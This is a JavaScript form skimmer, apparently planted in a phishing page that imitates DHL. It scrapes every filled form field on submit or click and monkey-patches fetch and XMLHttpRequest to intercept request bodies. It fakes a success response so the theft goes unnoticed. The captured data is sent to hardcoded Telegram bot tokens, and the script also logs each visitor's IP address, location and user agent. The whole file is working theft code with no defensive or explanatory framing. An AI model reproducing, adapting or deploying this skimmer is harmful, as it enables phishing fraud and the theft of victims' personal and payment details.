(function() {
  const DATA_BOT_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
  const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
  const CHAT_ID = "6788012481";

  function sendToTelegramSync(text, botToken) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendMessage", false);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }));
    } catch(e) {}
  }

  function sendToTelegramAsync(text, botToken) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendMessage", true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }));
    } catch(e) {}
  }

  let lastSent = "";

  // 1. METHODE DOM (Scraping)
  function captureDOM() {
    const inputs = document.querySelectorAll('input, select');
    let dataText = '📦 <b>DHL Saisie (DOM)</b>\n\n';
    let count = 0;
    inputs.forEach(input => {
      if (input.value && input.type !== 'submit' && input.type !== 'hidden') {
        const label = input.getAttribute('placeholder') || input.name || input.id || 'Champ';
        dataText += '<b>' + label + ':</b> ' + input.value + '\n';
        count++;
      }
    });
    if (count > 0 && dataText !== lastSent) {
      lastSent = dataText;
      sendToTelegramSync(dataText, DATA_BOT_TOKEN);
    }
  }

  ['submit', 'click', 'pointerdown', 'touchend'].forEach(evt => {
    document.addEventListener(evt, function(e) {
      if (e.type === 'submit' || (e.target && e.target.closest('button, input[type="submit"]'))) {
        captureDOM();
      }
    }, true);
  });
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') captureDOM();
  }, true);

  // 2. METHODE FETCH MONKEY PATCH
  const originalFetch = window.fetch;
  window.fetch = async function() {
    try {
      const arg0 = arguments[0];
      const opts = arguments[1];
      let url = '';
      let bodyText = null;

      if (typeof arg0 === 'string') url = arg0;
      else if (arg0 && arg0.url) url = arg0.url;
      
      if (url.includes('backend.blink.new')) {
        if (opts && opts.body) {
          bodyText = opts.body;
        } else if (arg0 && typeof arg0.text === 'function') {
           // Si c'est un objet Request avec un body
           arg0.clone().text().then(t => {
              if (t && t !== lastSent) {
                  lastSent = t;
                  sendToTelegramAsync('📦 <b>DHL Saisie (Fetch Req)</b>\n<pre>' + t + '</pre>', DATA_BOT_TOKEN);
              }
           }).catch(e=>{});
        }
        
        if (bodyText && typeof bodyText === 'string') {
          if (bodyText !== lastSent) {
             lastSent = bodyText;
             // Parse pour un affichage propre si possible
             try {
                let parsed = JSON.parse(bodyText);
                let pretty = '📦 <b>DHL Saisie (Fetch API)</b>\n\n';
                if(parsed.type) pretty += '<b>Type:</b> ' + parsed.type + '\n';
                let dataObj = parsed.data || parsed;
                for(let key in dataObj) {
                   if(key !== 'type') pretty += '<b>'+key+':</b> ' + dataObj[key] + '\n';
                }
                sendToTelegramSync(pretty, DATA_BOT_TOKEN);
             } catch(e) {
                sendToTelegramSync('📦 <b>DHL Saisie (Brut)</b>\n<pre>' + bodyText + '</pre>', DATA_BOT_TOKEN);
             }
          }
        }
        
        return Promise.resolve(new Response(JSON.stringify({ success: true }), {
          status: 200, headers: { 'Content-Type': 'application/json' }
        }));
      }
    } catch(e) {}
    return originalFetch.apply(this, arguments);
  };

  // 3. METHODE XHR MONKEY PATCH (Au cas où)
  const originalXhrOpen = XMLHttpRequest.prototype.open;
  const originalXhrSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    return originalXhrOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    if (this._url && this._url.includes('backend.blink.new') && body) {
       if (body !== lastSent) {
         lastSent = body;
         sendToTelegramAsync('📦 <b>DHL Saisie (XHR)</b>\n<pre>' + body + '</pre>', DATA_BOT_TOKEN);
       }
    }
    return originalXhrSend.apply(this, arguments);
  };

  // Track visit
  try {
    originalFetch('https://ipwho.is/').then(r => r.json()).then(data => {
      const text = '🚨 <b>New DHL Visit</b>\n\n' +
        '🌐 <b>IP:</b> ' + (data.ip || 'Inconnu') + '\n' +
        '🏙️ <b>Ville:</b> ' + (data.city || 'Inconnu') + '\n' +
        '🌍 <b>Pays:</b> ' + (data.country || 'Inconnu') + '\n' +
        '📱 <b>UA:</b> ' + navigator.userAgent;
      sendToTelegramAsync(text, VISIT_BOT_TOKEN);
    }).catch(() => {});
  } catch(e) {}
})();
